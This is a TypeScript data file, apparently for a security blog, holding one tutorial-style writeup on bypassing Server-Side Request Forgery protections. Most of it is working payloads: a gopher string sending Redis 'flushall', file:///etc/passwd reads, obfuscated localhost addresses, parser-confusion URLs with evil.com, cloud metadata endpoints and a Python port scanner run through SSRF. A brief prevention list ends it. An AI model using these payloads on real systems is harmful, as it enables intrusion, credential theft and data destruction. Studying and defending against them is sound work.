
export interface Writeup {
  id: string;
  title: string;
  description: string;
  date: string;
  tags: string[];
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  content: string;
}

export const writeups: Writeup[] = [
  {
    id: "ssrf-bypass-techniques",
    title: "Advanced SSRF Bypass Techniques",
    description: "Deep dive into Server-Side Request Forgery vulnerabilities and modern bypass methods",
    date: "2024-01-15",
    tags: ["SSRF", "Web Security", "Bypass", "CTF"],
    difficulty: "Hard",
    content: `# Advanced SSRF Bypass Techniques

Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to make requests from the server to internal or external resources. This writeup explores advanced bypass techniques for modern SSRF protections.

## Understanding SSRF

**SSRF occurs when an application fetches remote resources based on user input without proper validation.**

The impact can range from:
- Internal network reconnaissance
- Access to internal services
- Cloud metadata access
- Remote code execution

## Basic SSRF Detection

First, let's identify potential SSRF endpoints:

\`\`\`bash
# Look for URL parameters
curl "https://target.com/fetch?url=http://evil.com/callback"

# Check for file uploads that process URLs
curl -X POST -F "file=http://internal.service/admin" https://target.com/upload
\`\`\`

## Bypass Techniques

### 1. Protocol Smuggling

Many filters only check for http/https but miss other protocols:

\`\`\`python
# Gopher protocol for internal services
payload = "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"

# File protocol for local file access
payload = "file:///etc/passwd"

# Dict protocol for port scanning
payload = "dict://127.0.0.1:22/info"
\`\`\`

### 2. IP Address Obfuscation

\`\`\`python
# Decimal representation
# 127.0.0.1 = 2130706433
payload = "http://2130706433/"

# Octal representation
payload = "http://0177.0.0.1/"

# Hex representation
payload = "http://0x7f.0x0.0x0.0x1/"

# IPv6 localhost
payload = "http://[::1]/"
\`\`\`

### 3. DNS Rebinding

\`\`\`bash
# Use services like xip.io
curl "https://target.com/fetch?url=http://127.0.0.1.xip.io/"

# Custom DNS records
dig 127.0.0.1.evil.com
\`\`\`

### 4. URL Parser Confusion

\`\`\`python
# Using @ symbol confusion
payload = "http://evil.com@127.0.0.1/"

# Using # fragment confusion  
payload = "http://127.0.0.1#@evil.com/"

# Using \\ backslash confusion
payload = "http://evil.com\\127.0.0.1/"
\`\`\`

## Advanced Exploitation

### Cloud Metadata Access

\`\`\`bash
# AWS metadata
curl "http://169.254.169.254/latest/meta-data/"

# Google Cloud metadata
curl "http://metadata.google.internal/computeMetadata/v1/"

# Azure metadata
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
\`\`\`

### Internal Service Discovery

\`\`\`python
import requests

# Port scanning via SSRF
def ssrf_port_scan(base_url, target_ip, ports):
    open_ports = []
    for port in ports:
        payload = f"http://{target_ip}:{port}/"
        try:
            response = requests.get(f"{base_url}?url={payload}", timeout=5)
            if response.status_code != 500:  # Adjust based on error responses
                open_ports.append(port)
        except:
            pass
    return open_ports

common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
open_ports = ssrf_port_scan("https://target.com/fetch", "10.0.0.100", common_ports)
\`\`\`

## Prevention

- Implement strict URL validation
- Use allowlists instead of blocklists  
- Disable unnecessary protocols
- Implement network segmentation
- Monitor outbound connections

## Tools

- **Gopherus**: Generate gopher payloads
- **SSRFmap**: Automated SSRF exploitation
- **Collaborator**: Burp's interaction server

This technique has been crucial in many CTF challenges and real-world penetration tests.`
  }
];
